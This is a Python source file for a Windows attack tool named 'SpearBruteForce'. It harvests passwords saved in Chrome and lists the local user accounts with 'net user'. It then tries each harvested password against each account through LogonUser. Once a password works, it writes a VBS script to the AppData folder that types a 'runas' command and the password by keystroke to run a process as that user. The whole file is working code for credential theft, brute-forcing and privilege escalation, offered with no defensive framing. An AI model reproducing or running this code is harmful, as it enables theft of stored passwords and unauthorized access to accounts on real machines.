import subprocess
import win32security
import os
from ChromePass import Chrome

class SpearBruteForce(object):

    def cmd(self,command):
        return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().strip().decode(errors='replace')

    def getPass(self):
        test = Chrome().show()
        new = []
        for i in test:
            if i not in new and len(i)>0:
                new.append(i)
        return new

    def getUsers(self):
        users = []
        for i in self.cmd('net user').split('----')[-1].split('  '):
            if len(i)>0:
                if 'The command completed successfully.' not in i:
                    if i[0]=='-':
                        c = 0
                        for n in i:
                            if n!='-':
                                break
                            c+=1
                        users.append(i[c:].strip())
                    else:
                        users.append(i.strip())
        return users

    def ispassword(self,domain,username,password):
        try:
            win32security.LogonUser (
            username,
            domain,
            password,
            win32security.LOGON32_LOGON_NETWORK,
            win32security.LOGON32_PROVIDER_DEFAULT
            )
        except win32security.error:
            return False
        else:
            return True

    def bruteOnetarget(self,password,user):
        for i in password:
            if self.ispassword('WORKGROUP',user,i):
                return i
        return False


    def runProgramasAdmin(self,username, process, password):
        script = 'set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run "cmd"\nWScript.Sleep 100 \nWshShell.AppActivate "C:\\Windows\\system32\\cmd.exe" \nWScript.Sleep 100 \nWshShell.SendKeys "runas /user:'+username+' '+process+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "'+password+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "exit"\nWshShell.SendKeys "{ENTER}"'
        path = os.environ['APPDATA']+os.sep+'PRVTEST'
        self.cmd('mkdir '+path)
        open(path+'\\testscript.vbs','w').write(script)
        return self.cmd ("cscript.exe //nologo //b "+path+'\\testscript.vbs ')

    def bruteallusers(self,password,users):
        res = ''
        for i in users:
            for n in password:
                if self.ispassword('WORKGROUP',i,n):
                    res+=(f"the password for user: {i} is {n}\n")
        if res:
            return res
        return False
